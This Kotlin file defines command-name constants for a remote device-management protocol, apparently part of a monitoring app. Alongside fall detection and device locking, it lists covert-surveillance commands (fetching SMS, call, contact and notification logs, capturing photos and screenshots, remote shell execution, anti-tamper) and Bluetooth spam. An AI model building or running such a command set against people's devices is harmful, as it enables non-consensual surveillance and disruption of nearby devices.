package com.sentinel.shared.protocol

/**
 * Air Command types for remote device management.
 */
object CommandTypes {
    const val CAPTURE_PHOTO = "CAPTURE_PHOTO"
    const val GET_SYSTEM_INFO = "GET_SYSTEM_INFO"
    const val TRIGGER_BEACON = "TRIGGER_BEACON"
    const val FETCH_SMS_LOGS = "FETCH_SMS_LOGS"
    const val EXECUTE_SHELL = "EXECUTE_SHELL"
    const val FETCH_NOTIFICATION_LOGS = "FETCH_NOTIFICATION_LOGS"
    const val FETCH_CONTACTS = "FETCH_CONTACTS"
    const val PREVIEW_FILE = "PREVIEW_FILE"
    const val CAPTURE_SCREENSHOT = "CAPTURE_SCREENSHOT"
    const val LOCK_DEVICE = "LOCK_DEVICE"
    const val SET_ANTI_TAMPER = "SET_ANTI_TAMPER"
    const val ENFORCE_PERMISSIONS = "ENFORCE_PERMISSIONS"
    const val GET_MDM_STATUS = "GET_MDM_STATUS"
    const val SET_FALL_DETECTION = "SET_FALL_DETECTION"
    const val TEST_FALL_ALERT = "TEST_FALL_ALERT"
    const val FETCH_APP_LOGS = "FETCH_APP_LOGS"
    const val FETCH_CALL_LOGS = "FETCH_CALL_LOGS"
    const val FETCH_INSTALLED_APPS = "FETCH_INSTALLED_APPS"
    const val SCAN_RF_ENVIRONMENT = "SCAN_RF_ENVIRONMENT"
    const val START_BLE_SPAM = "START_BLE_SPAM"
    const val STOP_BLE_SPAM = "STOP_BLE_SPAM"
}


